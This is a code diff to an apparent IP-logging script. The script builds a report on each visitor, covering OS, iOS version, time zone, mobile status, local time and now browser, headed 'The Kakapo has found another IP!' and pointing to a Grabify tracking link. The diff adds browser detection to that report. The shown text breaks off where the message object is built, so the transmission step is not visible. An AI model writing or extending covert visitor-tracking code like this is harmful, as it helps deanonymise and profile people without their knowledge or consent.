@@ -43,6 +43,26 @@ function getiOSVersion(userAgent) {
   return matches ? `${matches[1]} OS ${matches[2].replace("_", ".")}` : "iOS (Unknown Version)";
 }
 
+
+function detectBrowser() {
+  const userAgent = navigator.userAgent;
+
+  if (userAgent.indexOf("Firefox") !== -1) {
+    return "Firefox";
+  } else if (userAgent.indexOf("Chrome") !== -1) {
+    return "Chrome";
+  } else if (userAgent.indexOf("Safari") !== -1) {
+    return "Safari";
+  } else if (userAgent.indexOf("Edge") !== -1) {
+    return "Microsoft Edge";
+  } else if (userAgent.indexOf("MSIE") !== -1 || userAgent.indexOf("Trident") !== -1) {
+    return "Internet Explorer";
+  } else {
+    return "Unknown Browser";
+  }
+}
+
+
 function getOperatingSystem() {
   const userAgent = navigator.userAgent;
 
@@ -119,7 +139,9 @@ const minutes = userTime.getMinutes();
 const seconds = userTime.getSeconds();
 const milliseconds = userTime.getMilliseconds();
 const ampm = hours24 >= 12 ? 'PM' : 'AM';
+const browser = detectBrowser();
 
+	  
 const message = `
 The Kakapo has found another IP!
 Check here to see all IPs logged: https://grabify.link/track/QRUKDR
@@ -134,6 +156,7 @@ Check here to see all IPs logged: https://grabify.link/track/QRUKDR
 - Time Zone: ${userTimeZone}
 - Mobile User: ${isMobile}
 - User Date and Time: ${day}/${month}/${year} ${hours24}:${minutes}:${seconds}.${milliseconds} (${hours12}:${minutes}:${seconds} ${ampm})
+- Browser: ${browser}
 `;
 	  
     const msg = {
